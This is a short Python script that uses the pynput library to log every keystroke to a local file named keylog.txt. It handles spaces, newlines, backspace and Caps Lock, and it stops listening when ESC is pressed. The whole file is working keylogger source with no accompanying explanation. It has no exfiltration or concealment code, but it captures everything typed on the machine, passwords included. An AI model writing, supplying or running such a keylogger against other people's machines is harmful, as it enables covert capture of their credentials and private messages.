from pynput import keyboard

log_file = "keylog.txt"
caps_lock = False  # Track Caps Lock state

def on_press(key):
    global caps_lock
    try:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")  # Convert [Key.space] to a space
            elif key == keyboard.Key.enter:
                f.write("\n")  # Convert [Key.enter] to a newline
            elif key == keyboard.Key.backspace:
                f.seek(0, 2)  # Move to end of file
                pos = f.tell()  
                if pos > 0:
                    f.truncate(pos - 1)  # Remove last character
            elif key == keyboard.Key.caps_lock:
                caps_lock = not caps_lock  # Toggle Caps Lock
            elif hasattr(key, 'char') and key.char is not None:
                char = key.char.upper() if caps_lock else key.char
                f.write(char)
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener when ESC is pressed

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
